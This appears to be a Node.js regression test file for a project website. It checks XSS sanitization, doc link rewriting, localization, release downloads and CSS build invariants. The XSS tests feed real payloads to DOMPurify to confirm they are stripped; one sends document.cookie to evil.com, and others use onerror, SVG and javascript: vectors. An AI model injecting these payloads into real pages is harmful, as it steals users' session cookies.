/**
 * Site integrity regression tests.
 *
 * Covers:
 *  - XSS hardening (behavioral: DOMPurify against real payloads)
 *  - Link rewriting (behavioral: resolveDocLink with real URLs)
 *  - Source invariants (structural: no CDN, no stale buttons, assets exist)
 *  - Tailwind CSS reproducibility
 *
 * Run: node --test site/site-integrity.test.mjs
 */
import assert from 'node:assert/strict';
import { existsSync, readFileSync } from 'node:fs';
import { createRequire } from 'node:module';
import { dirname, resolve } from 'node:path';
import { describe, it } from 'node:test';
import vm from 'node:vm';
import { assignDocHeadingIds, resolveDocLink, resolveImageSrc } from './lib/doc-links.mjs';
import { fetchLocalizedMarkdown, localizedDocCandidates } from './lib/doc-locale.mjs';
import { sanitizeMarkdown } from './lib/sanitize-md.mjs';

const require = createRequire(import.meta.url);
const { JSDOM } = require('jsdom');
const createDOMPurify = require('dompurify');
const { marked } = require('marked');

const SITE = resolve(dirname(new URL(import.meta.url).pathname));
const ROOT = resolve(SITE, '..');

function readSite(name) {
  return readFileSync(resolve(SITE, name), 'utf8');
}

// Execute the classic (non-module) lib/release-assets.js exactly as the browser
// does — in a fresh global — and read the ClowderReleaseAssets global it
// installs. The same file drives production and tests (production = test code path).
const { selectReleaseAssets } = (() => {
  const sandbox = {};
  sandbox.globalThis = sandbox;
  vm.createContext(sandbox);
  vm.runInContext(readSite('lib/release-assets.js'), sandbox);
  return sandbox.ClowderReleaseAssets;
})();

// ─── P1: XSS — behavioral sanitization tests ────────────────────────
describe('XSS sanitization (behavioral)', () => {
  // DOMPurify + marked versions pinned in root devDependencies to match CDN:
  //   dompurify@3.2.4, marked@15.0.7 (see package.json)
  const window = new JSDOM('').window;
  const DOMPurify = createDOMPurify(window);

  /**
   * Run the SAME sanitizeMarkdown function used by production pages.
   * Dependencies (DOMPurify, marked) are the CDN-pinned versions.
   */
  function renderIssueBody(body) {
    return sanitizeMarkdown(body, { DOMPurify, marked });
  }

  it('strips onerror XSS payload from issue body', () => {
    const malicious = '<img src=x onerror="alert(document.cookie)">';
    const clean = renderIssueBody(malicious);
    assert.doesNotMatch(clean, /onerror/i, 'onerror handler must be stripped');
    assert.doesNotMatch(clean, /alert/i, 'alert call must be stripped');
  });

  it('strips javascript: protocol from issue body links', () => {
    const malicious = '[click me](javascript:alert(1))';
    const clean = renderIssueBody(malicious);
    assert.doesNotMatch(clean, /javascript:/i, 'javascript: protocol must be stripped');
  });

  it('strips script tags from issue body', () => {
    const malicious = '<script>fetch("https://evil.com?c="+document.cookie)</script>';
    const clean = renderIssueBody(malicious);
    assert.doesNotMatch(clean, /<script/i, 'script tags must be stripped');
  });

  it('strips event handlers embedded in markdown HTML', () => {
    const malicious = '<div onmouseover="alert(1)">hover me</div>';
    const clean = renderIssueBody(malicious);
    assert.doesNotMatch(clean, /onmouseover/i, 'onmouseover must be stripped');
  });

  it('strips SVG-based XSS payloads', () => {
    const malicious = '<svg><animate onbegin="alert(1)"/></svg>';
    const clean = renderIssueBody(malicious);
    assert.doesNotMatch(clean, /onbegin/i, 'SVG event handlers must be stripped');
  });

  it('strips data URI script injection', () => {
    const malicious = '<a href="data:text/html,<script>alert(1)</script>">click</a>';
    const clean = renderIssueBody(malicious);
    // DOMPurify strips data: URIs with text/html content type
    assert.doesNotMatch(clean, /data:text\/html/i, 'data: URI with HTML must be stripped');
  });

  it('preserves safe markdown content', () => {
    const safe = '## Hello\n\nThis is **bold** and [a link](https://example.com).';
    const clean = renderIssueBody(safe);
    assert.match(clean, /Hello/, 'headings must survive');
    assert.match(clean, /<strong>bold<\/strong>/, 'bold must survive');
    assert.match(clean, /href="https:\/\/example\.com"/, 'safe links must survive');
  });
});

// ─── P1: community.html structural invariants ────────────────────────
describe('community.html XSS invariants', () => {
  const html = readSite('community.html');

  it('does not use inline onclick for issue rows', () => {
    assert.doesNotMatch(html, /onclick\s*=\s*["']showIssueDetail\(/, 'inline onclick with issue data is an XSS vector');
  });

  it('uses issueMap lookup instead of inline attribute data', () => {
    assert.match(html, /issueMap\.get\(/, 'issue detail should retrieve data from Map');
  });

  it('imports lib/sanitize-md.mjs as a module', () => {
    assert.match(
      html,
      /import\s*\{[^}]*sanitizeMarkdown[^}]*\}\s*from\s*['"]\.\/lib\/sanitize-md\.mjs['"]/,
      'community.html must import sanitizeMarkdown from lib/sanitize-md.mjs',
    );
  });

  it('calls _sanitizeMarkdown (not inline DOMPurify.sanitize(marked.parse(...)))', () => {
    assert.match(html, /window\._sanitizeMarkdown\(/, 'sanitization must delegate to the shared module');
    // Inline script must NOT call DOMPurify.sanitize(marked.parse(...)) directly
    const scriptMatch = html.match(/<script>[\s\S]*?<\/script>/g) || [];
    const inlineScripts = scriptMatch.join('');
    assert.doesNotMatch(
      inlineScripts,
      /DOMPurify\.sanitize\(\s*marked\.parse\(/,
      'inline script must not bypass sanitize-md.mjs',
    );
  });
});

describe('localized accessible names', () => {
  for (const page of ['index.html', 'community.html', 'docs.html']) {
    it(`${page} localizes every static aria-label`, () => {
      const dom = new JSDOM(readSite(page));
      const missingKeys = [...dom.window.document.querySelectorAll('[aria-label]')]
        .filter((element) => !element.hasAttribute('data-i18n-aria-label'))
        .map((element) => element.outerHTML);
      assert.deepStrictEqual(missingKeys, [], `${page} has untranslated accessible names`);
    });
  }

  it('does not use a translated accessible name as a JavaScript selector', () => {
    const html = readSite('community.html');
    assert.doesNotMatch(html, /querySelector\([^)]*aria-label/);
    assert.match(html, /getElementById\(['"]issue-detail-close['"]\)/);
  });

  it('localizes the accessible name of dynamically rendered issue rows', () => {
    const html = readSite('community.html');
    assert.match(html, /row\.setAttribute\(['"]aria-label['"],\s*`\$\{t\(['"]community\.a11y\.issue['"]\)\}/);
  });

  it('restores focus to the replacement issue row after a translation rerender', () => {
    const html = readSite('community.html');
    const inlineScript = html.match(/<script>\s*(const REPO[\s\S]*?)<\/script>/)?.[1];
    assert.ok(inlineScript, 'community inline script must be present');

    const dom = new JSDOM(html, {
      runScripts: 'outside-only',
      url: 'https://example.test/site/community.html',
    });
    dom.window.I18N = I18N;
    dom.window.HTMLElement.prototype.scrollIntoView = () => {};
    dom.window.eval(inlineScript);

    const issue = {
      number: 42,
      title: 'Focus regression',
      body: null,
      labels: [],
      comments: 0,
      created_at: '2026-09-03T00:00:00Z',
      html_url: 'https://github.com/zts212653/clowder-ai/issues/42',
    };
    dom.window.renderIssues([issue]);
    const originalRow = dom.window.document.querySelector('[data-issue-number="42"]');
    originalRow.focus();
    dom.window.showIssueDetail(42);

    dom.window.renderIssues([issue]);
    const replacementRow = dom.window.document.querySelector('[data-issue-number="42"]');
    assert.notStrictEqual(replacementRow, originalRow);
    assert.equal(originalRow.isConnected, false);

    dom.window.closeIssueDetail();
    assert.strictEqual(dom.window.document.activeElement, replacementRow);
  });
});

describe('localized community request states', () => {
  async function createCommunityDom() {
    const html = readSite('community.html');
    const inlineScript = html.match(/<script>\s*(const REPO[\s\S]*?)<\/script>/)?.[1];
    assert.ok(inlineScript, 'community inline script must be present');

    const dom = new JSDOM(html, {
      runScripts: 'outside-only',
      url: 'https://example.test/site/community.html',
    });
    await new Promise((resolve) => {
      if (dom.window.document.readyState === 'loading') {
        dom.window.document.addEventListener('DOMContentLoaded', resolve, { once: true });
      } else {
        resolve();
      }
    });
    dom.window.I18N = I18N;
    dom.window.HTMLElement.prototype.scrollIntoView = () => {};
    dom.window.eval(inlineScript);
    return dom;
  }

  it('keeps loading and error views through language changes instead of showing stale cached rows', async () => {
    const dom = await createCommunityDom();
    const previousIssue = {
      number: 42,
      title: 'Previous filter result',
      body: null,
      labels: [],
      comments: 0,
      created_at: '2026-09-03T00:00:00Z',
      html_url: 'https://github.com/zts212653/clowder-ai/issues/42',
    };
    dom.window.fetch = async () => ({ ok: true, json: async () => [previousIssue] });
    await dom.window.loadIssues('all');

    let resolvePending;
    dom.window.fetch = () =>
      new Promise((resolve) => {
        resolvePending = resolve;
      });
    const pendingLoad = dom.window.loadIssues('bug');
    dom.window.dispatchEvent(new dom.window.CustomEvent('clowder:languagechange'));

    const container = dom.window.document.getElementById('issues-container');
    assert.match(container.textContent, /Loading issues/);
    assert.equal(
      container.querySelector('.issue-row'),
      null,
      'language changes must not reveal cached rows while loading',
    );

    resolvePending({ ok: true, json: async () => [] });
    await pendingLoad;

    dom.window.fetch = async () => {
      throw new Error('offline');
    };
    await dom.window.loadIssues('enhancement');
    dom.window.dispatchEvent(new dom.window.CustomEvent('clowder:languagechange'));
    assert.match(container.textContent, /Could not load issues/);
    assert.equal(
      container.querySelector('.issue-row'),
      null,
      'language changes must not reveal cached rows after an error',
    );
  });

  it('ignores a superseded filter response that resolves after the active request', async () => {
    const dom = await createCommunityDom();
    const issue = (number, title) => ({
      number,
      title,
      body: null,
      labels: [],
      comments: 0,
      created_at: '2026-09-03T00:00:00Z',
      html_url: `https://github.com/zts212653/clowder-ai/issues/${number}`,
    });

    let resolveSuperseded;
    dom.window.fetch = (url) => {
      if (url.includes('labels=bug')) {
        return Promise.resolve({ ok: true, json: async () => [issue(2, 'Active result')] });
      }
      return new Promise((resolve) => {
        resolveSuperseded = resolve;
      });
    };

    const supersededLoad = dom.window.loadIssues('all');
    await dom.window.loadIssues('bug');
    resolveSuperseded({ ok: true, json: async () => [issue(1, 'Superseded result')] });
    await supersededLoad;

    const container = dom.window.document.getElementById('issues-container');
    assert.match(container.textContent, /Active result/);
    assert.doesNotMatch(container.textContent, /Superseded result/);
  });
});

describe('localized roadmap bars', () => {
  const dom = new JSDOM(readSite('index.html'));
  const bars = [...dom.window.document.querySelectorAll('#roadmap .gantt-bar')];

  it('localizes every bar label and hover description', () => {
    assert.ok(bars.length > 0, 'roadmap should contain bars');
    assert.deepStrictEqual(
      bars.filter((bar) => !bar.hasAttribute('data-i18n')).map((bar) => bar.textContent.trim()),
      [],
      'every roadmap bar label needs an i18n key',
    );
    assert.deepStrictEqual(
      bars
        .filter((bar) => bar.hasAttribute('title') && !bar.hasAttribute('data-i18n-title'))
        .map((bar) => bar.getAttribute('title')),
      [],
      'every roadmap hover description needs an i18n key',
    );
  });
});

describe('localized document titles', () => {
  const pages = [
    ['index.html', 'meta.home.title'],
    ['community.html', 'meta.community.title'],
    ['docs.html', 'meta.docs.title'],
  ];

  for (const [page, key] of pages) {
    it(`${page} updates the browser title when Chinese is applied`, async () => {
      const dom = new JSDOM(readSite(page), {
        runScripts: 'outside-only',
        url: `https://example.test/site/${page}`,
      });
      await new Promise((resolve) => {
        if (dom.window.document.readyState === 'loading') {
          dom.window.document.addEventListener('DOMContentLoaded', resolve, { once: true });
        } else {
          resolve();
        }
      });
      dom.window.I18N = I18N;
      dom.window.eval(readSite('main.js'));

      const title = dom.window.document.querySelector('title');
      assert.equal(title?.getAttribute('data-i18n'), key);
      dom.window.applyLang('zh');
      assert.equal(dom.window.document.title, I18N.zh[key]);
      assert.notEqual(I18N.zh[key], I18N.en[key]);
    });
  }
});

// ─── P1: Locale-aware Markdown fallback — behavioral tests ───────────
describe('localized docs loader (behavioral)', () => {
  it('tries the zh-CN sibling before the canonical path for Chinese', () => {
    assert.deepStrictEqual(localizedDocCandidates('README.md', 'zh'), ['README.zh-CN.md', 'README.md']);
    assert.deepStrictEqual(localizedDocCandidates('docs/faq.md', 'zh'), ['docs/faq.zh-CN.md', 'docs/faq.md']);
    assert.deepStrictEqual(localizedDocCandidates('docs/faq.md', 'en'), ['docs/faq.md']);
  });

  it('does not append the locale suffix twice', () => {
    assert.deepStrictEqual(localizedDocCandidates('docs/faq.zh-CN.md', 'zh'), ['docs/faq.zh-CN.md']);
  });

  it('loads an available Chinese sibling', async () => {
    const requested = [];
    const result = await fetchLocalizedMarkdown('docs/faq.md', 'zh', async (path) => {
      requested.push(path);
      return { ok: true, text: async () => '# 中文 FAQ' };
    });
    assert.deepStrictEqual(requested, ['docs/faq.zh-CN.md']);
    assert.deepStrictEqual(result, { path: 'docs/faq.zh-CN.md', markdown: '# 中文 FAQ' });
  });

  it('falls back to the canonical document when the Chinese sibling is missing', async () => {
    const requested = [];
    const result = await fetchLocalizedMarkdown('docs/architecture/memory/README.md', 'zh', async (path) => {
      requested.push(path);
      if (path.endsWith('.zh-CN.md')) return { ok: false, status: 404 };
      return { ok: true, text: async () => '# 记忆系统' };
    });
    assert.deepStrictEqual(requested, [
      'docs/architecture/memory/README.zh-CN.md',
      'docs/architecture/memory/README.md',
    ]);
    assert.equal(result.path, 'docs/architecture/memory/README.md');
    assert.equal(result.markdown, '# 记忆系统');
  });

  it('falls back to the canonical document when the localized request fails', async () => {
    const requested = [];
    const result = await fetchLocalizedMarkdown('docs/faq.md', 'zh', async (path) => {
      requested.push(path);
      if (path.endsWith('.zh-CN.md')) throw new TypeError('network error');
      return { ok: true, text: async () => '# FAQ' };
    });

    assert.deepStrictEqual(result, { path: 'docs/faq.md', markdown: '# FAQ' });
    assert.deepStrictEqual(requested, ['docs/faq.zh-CN.md', 'docs/faq.md']);
  });

  it('ships the translated siblings while keeping memory on canonical fallback', () => {
    for (const path of [
      'README.zh-CN.md',
      'SETUP.zh-CN.md',
      'docs/faq.zh-CN.md',
      'docs/configuration/startup.zh-CN.md',
      'docs/configuration/environment.zh-CN.md',
      'docs/architecture/overview.zh-CN.md',
      'docs/architecture/a2a-protocol.zh-CN.md',
      'docs/architecture/plugin-architecture.zh-CN.md',
    ]) {
      assert.ok(existsSync(resolve(ROOT, path)), `${path} must exist`);
    }
    assert.ok(existsSync(resolve(ROOT, 'docs/architecture/memory/README.md')));
    assert.ok(!existsSync(resolve(ROOT, 'docs/architecture/memory/README.zh-CN.md')));
  });
});

describe('feature index view states (behavioral)', () => {
  it('preserves loading and error states instead of treating them as empty results', async () => {
    const { selectFeatureIndexView } = await import('./lib/feature-index-state.mjs');
    assert.deepStrictEqual(selectFeatureIndexView('loading', [], '', 'all'), {
      kind: 'message',
      key: 'docs.loading.features',
    });
    assert.deepStrictEqual(selectFeatureIndexView('error', [], '', 'all'), {
      kind: 'message',
      key: 'docs.error.features',
    });
  });

  it('filters only after the feature index is ready', async () => {
    const { selectFeatureIndexView } = await import('./lib/feature-index-state.mjs');
    const features = [
      { id: 'F001', name: 'First', normalizedStatus: 'done' },
      { id: 'F002', name: 'Second', normalizedStatus: 'in-progress' },
    ];
    assert.deepStrictEqual(selectFeatureIndexView('ready', features, 'second', 'in-progress'), {
      kind: 'features',
      features: [features[1]],
    });
  });
});

// ─── P1: docs.html uses doc-links.mjs (production = test code path) ─
describe('docs.html link rewriting implementation', () => {
  const html = readSite('docs.html');

  it('imports lib/doc-links.mjs as a module', () => {
    assert.match(
      html,
      /import\s*\{[^}]*resolveDocLink[^}]*\}\s*from\s*['"]\.\/lib\/doc-links\.mjs['"]/,
      'docs.html must import resolveDocLink from lib/doc-links.mjs',
    );
  });

  it('calls _resolveDocLink (not inline URL resolution)', () => {
    assert.match(html, /window\._resolveDocLink\(/, 'rewriteDocLinks must delegate to the shared module');
  });

  it('calls _resolveImageSrc (not inline URL resolution)', () => {
    assert.match(html, /window\._resolveImageSrc\(/, 'image rewriting must delegate to the shared module');
  });

  it('does not duplicate URL resolution logic inline', () => {
    // The inline script should NOT contain the resolution regex — that lives in doc-links.mjs
    const scriptMatch = html.match(/<script>[\s\S]*?<\/script>/g) || [];
    const inlineScripts = scriptMatch.join('');
    assert.doesNotMatch(
      inlineScripts,
      /new URL\(href,\s*['"]file:\/\/\/['"]/,
      'URL resolution math must not be duplicated inline',
    );
  });

  it('calls _sanitizeMarkdown (not inline DOMPurify.sanitize(marked.parse(...)))', () => {
    assert.match(html, /window\._sanitizeMarkdown\(/, 'doc rendering must delegate to shared sanitize-md.mjs');
    const scriptMatch = html.match(/<script>[\s\S]*?<\/script>/g) || [];
    const inlineScripts = scriptMatch.join('');
    assert.doesNotMatch(
      inlineScripts,
      /DOMPurify\.sanitize\(\s*marked\.parse\(/,
      'inline script must not bypass sanitize-md.mjs',
    );
  });

  it('imports and calls the shared locale-aware Markdown loader', () => {
    assert.match(
      html,
      /import\s*\{[^}]*fetchLocalizedMarkdown[^}]*\}\s*from\s*['"]\.\/lib\/doc-locale\.mjs['"]/,
      'docs.html must import locale loading from lib/doc-locale.mjs',
    );
    assert.match(
      html,
      /window\._fetchLocalizedMarkdown\(/,
      'loadDoc must delegate locale fallback to the shared module',
    );
    assert.match(html, /clowder:languagechange/, 'docs.html must reload the current document after a language change');
  });

  it('assigns stable ids to rendered Markdown headings before link navigation', () => {
    assert.match(
      html,
      /window\._assignDocHeadingIds\(content\)/,
      'docs.html must make rendered headings addressable before rewriting links',
    );
  });

  it('passes an explicit document-link language through to the loader', () => {
    assert.match(html, /loadDoc\(result\.path,\s*result\.lang\)/);
  });

  it('tracks feature-index loading and error states through a shared selector', () => {
    assert.match(html, /featureIndexState/);
    assert.match(html, /window\._selectFeatureIndexView\(/);
  });
});

// ─── P1: Test dep versions match production CDN ─────────────────────
describe('test dependency version alignment', () => {
  it('marked version matches CDN pin in community.html', () => {
    const html = readSite('community.html');
    const cdnMatch = html.match(/marked@([\d.]+)/);
    assert.ok(cdnMatch, 'community.html must have version-pinned marked CDN');
    const testVersion = require('marked/package.json').version;
    assert.equal(testVersion, cdnMatch[1], `Test marked@${testVersion} must match CDN marked@${cdnMatch[1]}`);
  });

  it('DOMPurify version matches CDN pin in community.html', () => {
    const html = readSite('community.html');
    const cdnMatch = html.match(/dompurify@([\d.]+)/);
    assert.ok(cdnMatch, 'community.html must have version-pinned dompurify CDN');
    const pkgPath = resolve(ROOT, 'node_modules/dompurify/package.json');
    const testVersion = JSON.parse(readFileSync(pkgPath, 'utf8')).version;
    assert.equal(testVersion, cdnMatch[1], `Test dompurify@${testVersion} must match CDN dompurify@${cdnMatch[1]}`);
  });
});

// ─── P1: Link rewriting — behavioral tests ───────────────────────────
describe('resolveDocLink (behavioral)', () => {
  const loadable = new Set(['docs/faq.md', 'docs/configuration/environment.md', 'SETUP.md', 'README.md']);

  it('resolves root-relative .md link to viewer', () => {
    const result = resolveDocLink('SETUP.md', 'README.md', loadable);
    assert.equal(result.type, 'viewer');
    assert.equal(result.path, 'SETUP.md');
    assert.equal(result.hash, '');
  });

  it('resolves relative .md link from subdirectory to viewer', () => {
    const result = resolveDocLink('../faq.md', 'docs/configuration/environment.md', loadable);
    assert.equal(result.type, 'viewer');
    assert.equal(result.path, 'docs/faq.md');
  });

  it('normalizes a localized sibling link back to the canonical viewer route', () => {
    const result = resolveDocLink('SETUP.zh-CN.md', 'README.zh-CN.md', loadable);
    assert.deepStrictEqual(result, { type: 'viewer', path: 'SETUP.md', hash: '', lang: 'zh' });
  });

  it('honors same-document language selectors without changing ordinary cross-document links', () => {
    assert.match(readFileSync(resolve(ROOT, 'README.zh-CN.md'), 'utf8'), /\[English\]\(README\.md\)/);
    assert.match(readFileSync(resolve(ROOT, 'README.md'), 'utf8'), /\[中文\]\(README\.zh-CN\.md\)/);

    assert.deepStrictEqual(resolveDocLink('README.md', 'README.zh-CN.md', loadable), {
      type: 'viewer',
      path: 'README.md',
      hash: '',
      lang: 'en',
    });
    assert.deepStrictEqual(resolveDocLink('README.zh-CN.md', 'README.md', loadable), {
      type: 'viewer',
      path: 'README.md',
      hash: '',
      lang: 'zh',
    });
    assert.deepStrictEqual(resolveDocLink('../faq.md', 'docs/configuration/environment.zh-CN.md', loadable), {
      type: 'viewer',
      path: 'docs/faq.md',
      hash: '',
    });
  });

  it('keeps translated cross-document fragments aligned with translated headings', () => {
    const environmentZh = readFileSync(resolve(ROOT, 'docs/configuration/environment.zh-CN.md'), 'utf8');
    assert.match(environmentZh, /\.\.\/faq\.md#在哪里添加-api-密钥/);

    const result = resolveDocLink(
      '../faq.md#%E5%9C%A8%E5%93%AA%E9%87%8C%E6%B7%BB%E5%8A%A0-api-%E5%AF%86%E9%92%A5',
      'docs/configuration/environment.zh-CN.md',
      loadable,
    );
    assert.deepStrictEqual(result, {
      type: 'viewer',
      path: 'docs/faq.md',
      hash: '#在哪里添加-api-密钥',
    });

    const faqZh = readFileSync(resolve(ROOT, 'docs/faq.zh-CN.md'), 'utf8');
    const DOMPurify = createDOMPurify(new JSDOM('').window);
    const rendered = new JSDOM(`<article>${sanitizeMarkdown(faqZh, { DOMPurify, marked })}</article>`);
    const article = rendered.window.document.querySelector('article');
    assignDocHeadingIds(article);
    assert.ok(rendered.window.document.getElementById(result.hash.slice(1)));
  });

  it('preserves hash fragment for in-viewer navigation', () => {
    const result = resolveDocLink('../faq.md#where-do-i-add-api-keys', 'docs/configuration/environment.md', loadable);
    assert.equal(result.type, 'viewer');
    assert.equal(result.path, 'docs/faq.md');
    assert.equal(result.hash, '#where-do-i-add-api-keys');
  });

  it('resolves non-.md file to GitHub blob with hash', () => {
    const result = resolveDocLink('LICENSE', 'README.md', loadable);
    assert.equal(result.type, 'github');
    assert.match(result.url, /github\.com.*\/blob\/main\/LICENSE$/);
  });

  it('resolves .md not in loadable set to GitHub blob', () => {
    const result = resolveDocLink('docs/SOP.md', 'README.md', loadable);
    assert.equal(result.type, 'github');
    assert.match(result.url, /github\.com.*\/blob\/main\/docs\/SOP\.md$/);
  });

  it('preserves search + hash on GitHub blob links', () => {
    const result = resolveDocLink('CONTRIBUTING.md?tab=readme#dev-setup', 'README.md', loadable);
    assert.equal(result.type, 'github');
    assert.match(result.url, /CONTRIBUTING\.md\?tab=readme#dev-setup$/);
  });

  it('skips absolute URLs', () => {
    assert.deepEqual(resolveDocLink('https://example.com', 'README.md', loadable), { type: 'skip' });
  });

  it('skips pure anchors', () => {
    assert.deepEqual(resolveDocLink('#section', 'README.md', loadable), { type: 'skip' });
  });

  it('skips mailto links', () => {
    assert.deepEqual(resolveDocLink('mailto:a@b.com', 'README.md', loadable), { type: 'skip' });
  });

  it('skips javascript: URIs', () => {
    assert.deepEqual(resolveDocLink('javascript:alert(1)', 'README.md', loadable), { type: 'skip' });
  });

  it('skips null/empty href', () => {
    assert.deepEqual(resolveDocLink('', 'README.md', loadable), { type: 'skip' });
    assert.deepEqual(resolveDocLink(null, 'README.md', loadable), { type: 'skip' });
  });
});

describe('assignDocHeadingIds (behavioral)', () => {
  it('creates readable Unicode ids and de-duplicates repeated headings', () => {
    const dom = new JSDOM(
      '<article><h2>在哪里添加 API 密钥？</h2><h2>Repeat</h2><h3>Repeat</h3><h2 id="kept">Kept</h2></article>',
    );
    const article = dom.window.document.querySelector('article');

    assignDocHeadingIds(article);

    assert.deepStrictEqual(
      [...article.querySelectorAll('h2, h3')].map((heading) => heading.id),
      ['在哪里添加-api-密钥', 'repeat', 'repeat-1', 'kept'],
    );
  });
});

describe('resolveImageSrc (behavioral)', () => {
  it('resolves relative image to GitHub raw URL', () => {
    const url = resolveImageSrc('images/arch.png', 'docs/architecture/overview.md');
    assert.match(url, /raw\.githubusercontent\.com.*\/docs\/architecture\/images\/arch\.png$/);
  });

  it('resolves root image from subdoc', () => {
    const url = resolveImageSrc('../../assets/logo.png', 'docs/architecture/overview.md');
    assert.match(url, /raw\.githubusercontent\.com.*\/assets\/logo\.png$/);
  });

  it('returns null for absolute URLs', () => {
    assert.equal(resolveImageSrc('https://cdn.example.com/img.png', 'README.md'), null);
  });

  it('returns null for data URIs', () => {
    assert.equal(resolveImageSrc('data:image/png;base64,abc', 'README.md'), null);
  });
});

// ─── P1: macOS architecture-specific downloads — behavioral ─────────
describe('selectReleaseAssets (behavioral)', () => {
  const dl = (name) => ({ name, browser_download_url: `https://example.com/${name}` });

  it('routes Apple Silicon and Intel Mac users to different, arch-correct DMGs', () => {
    // Real v0.12.0 release shape: parallel arm64 + x64 DMGs, arm64 first in the array.
    const assets = [
      dl('ClowderAI-0.12.0-arm64.dmg'),
      dl('ClowderAI-0.12.0-x64.dmg'),
      dl('ClowderAI-0.12.0.zip'),
      dl('ClowderAI-Setup-0.12.0.exe'),
    ];
    const { macArm, macIntel, windows } = selectReleaseAssets(assets);
    assert.match(macArm.name, /arm64/, 'Apple Silicon button must resolve to the arm64 DMG');
    assert.match(macIntel.name, /x64/, 'Intel button must resolve to the x64 DMG');
    assert.notEqual(macArm.name, macIntel.name, 'the two arch buttons must not point at the same DMG');
    assert.match(windows.name, /\.exe$/, 'Windows button must resolve to the .exe');
  });

  it('falls back to the releases page (undefined) when an arch build is missing', () => {
    const { macArm, macIntel } = selectReleaseAssets([dl('ClowderAI-0.12.0-arm64.dmg')]);
    assert.match(macArm.name, /arm64/);
    assert.equal(macIntel, undefined, 'no Intel DMG → Intel button keeps its static /releases fallback');
  });

  it('serves a universal DMG to both architectures', () => {
    const { macArm, macIntel } = selectReleaseAssets([dl('ClowderAI-0.12.0-universal.dmg')]);
    assert.ok(macArm && macIntel);
    assert.equal(macArm.name, macIntel.name);
    assert.match(macArm.name, /universal/);
  });

  it('serves a lone untagged DMG to everyone', () => {
    const { macArm, macIntel } = selectReleaseAssets([dl('ClowderAI-0.12.0.dmg')]);
    assert.equal(macArm?.name, 'ClowderAI-0.12.0.dmg');
    assert.equal(macIntel?.name, 'ClowderAI-0.12.0.dmg');
  });

  it('tolerates empty or malformed releases without throwing', () => {
    // vm-loaded objects live in another realm, so compare fields, not deepEqual.
    const empty = selectReleaseAssets([]);
    assert.equal(empty.windows, undefined);
    assert.equal(empty.macArm, undefined);
    assert.equal(empty.macIntel, undefined);
    assert.equal(empty.macUniversal, undefined);
    assert.doesNotThrow(() => selectReleaseAssets(undefined));
    assert.doesNotThrow(() => selectReleaseAssets([null, { name: 42 }]));
  });
});

// ─── P1: download UI exposes both Mac architectures — structural ────
describe('download buttons (structural)', () => {
  it('index.html exposes both Apple Silicon and Intel Mac buttons', () => {
    const html = readSite('index.html');
    assert.match(html, /id="dl-mac-arm"/, 'must have an Apple Silicon (arm64) download button');
    assert.match(html, /id="dl-mac-intel"/, 'must have an Intel (x64) download button');
  });

  it('index.html has no ambiguous single-DMG macOS button', () => {
    const html = readSite('index.html');
    assert.doesNotMatch(html, /id="dl-mac"/, 'the ambiguous single #dl-mac button must be gone');
  });

  it('main.js resolves downloads via the shared ClowderReleaseAssets global', () => {
    const js = readSite('main.js');
    assert.match(js, /ClowderReleaseAssets/, 'main.js must use the shared ClowderReleaseAssets global');
    assert.match(js, /dl-mac-arm/, 'main.js must wire the Apple Silicon button');
    assert.match(js, /dl-mac-intel/, 'main.js must wire the Intel button');
    assert.doesNotMatch(js, /^\s*import\s/m, 'main.js must stay a classic script (static import would break file://)');
  });

  it('index.html loads classic release-assets.js before main.js (file:// safe)', () => {
    const html = readSite('index.html');
    const relIdx = html.indexOf('lib/release-assets.js');
    const mainIdx = html.indexOf('src="main.js"');
    assert.ok(relIdx > -1, 'index.html must load lib/release-assets.js');
    assert.ok(mainIdx > -1 && relIdx < mainIdx, 'release-assets.js must load before main.js');
    assert.doesNotMatch(
      html,
      /<script[^>]*type="module"[^>]*main\.js/,
      'main.js must NOT be an ES module (file:// direct-open contract)',
    );
  });
});

// ─── P2: No runtime Tailwind CDN ─────────────────────────────────────
describe('no runtime Tailwind CDN', () => {
  for (const page of ['index.html', 'docs.html', 'community.html']) {
    it(`${page} does not load cdn.tailwindcss.com`, () => {
      const html = readSite(page);
      assert.doesNotMatch(html, /cdn\.tailwindcss\.com/, `${page} should use pre-built tailwind.css, not CDN`);
    });
  }

  it('pre-built tailwind.css exists', () => {
    assert.ok(existsSync(resolve(SITE, 'tailwind.css')));
  });

  it('tailwind config exists for reproducible rebuilds', () => {
    assert.ok(existsSync(resolve(ROOT, 'tailwind.site.config.js')));
  });

  it('tailwind input CSS exists for reproducible rebuilds', () => {
    assert.ok(existsSync(resolve(SITE, 'input.css')));
  });

  it('tailwind build script exists', () => {
    assert.ok(existsSync(resolve(ROOT, 'scripts/build-site-css.mjs')));
  });

  it('generated Tailwind CSS is excluded from Biome formatting', () => {
    const biome = JSON.parse(readFileSync(resolve(ROOT, 'biome.json'), 'utf8'));
    assert.ok(
      biome.files.includes.includes('!site/tailwind.css'),
      'site/tailwind.css is generated and must be validated by check:site-css, not reformatted by Biome',
    );
  });
});

// ─── P2: lang toggle scoping ─────────────────────────────────────────
describe('lang toggle only on translated pages', () => {
  it('main.js skips initLang when lang-toggle button is absent', () => {
    const js = readSite('main.js');
    assert.match(js, /if\s*\(\s*!btn\s*\)\s*return/, 'initLang should bail without lang-toggle');
  });

  for (const page of ['index.html', 'community.html', 'docs.html']) {
    it(`${page} has a lang-toggle button (translated page)`, () => {
      const html = readSite(page);
      assert.match(html, /id\s*=\s*["']lang-toggle["']/);
      assert.ok(html.indexOf('src="i18n.js"') < html.indexOf('src="main.js"'), `${page} must load i18n.js first`);
    });
  }

  it('main.js emits a language-change event and translates supported attributes', () => {
    const js = readSite('main.js');
    assert.match(js, /function setLang\(/);
    assert.match(js, /clowder:languagechange/);
    assert.match(js, /data-i18n-placeholder/);
    assert.match(js, /data-i18n-label/);
    assert.match(js, /data-i18n-aria-label/);
    assert.match(js, /data-i18n-title/);
  });
});

// ─── i18n dictionary integrity ───────────────────────────────────────
// Load the classic site/i18n.js exactly as the browser does (it installs
// window.I18N), then assert every data-i18n key used in index.html resolves
// in BOTH locales and the two locales stay at key parity. Guards against
// orphan keys / typos whenever the homepage or the dictionary changes.
const I18N = (() => {
  const sandbox = { window: {} };
  vm.createContext(sandbox);
  vm.runInContext(readSite('i18n.js'), sandbox);
  return sandbox.window.I18N;
})();

describe('i18n dictionary integrity', () => {
  it('i18n.js installs window.I18N with en and zh locales', () => {
    assert.ok(I18N?.en && I18N?.zh, 'i18n.js must install window.I18N.en and window.I18N.zh');
  });

  for (const page of ['index.html', 'community.html', 'docs.html']) {
    it(`${page} uses i18n keys and every key (attrs + t()) resolves in both locales`, () => {
      const html = readSite(page);
      const keys = [
        ...new Set([
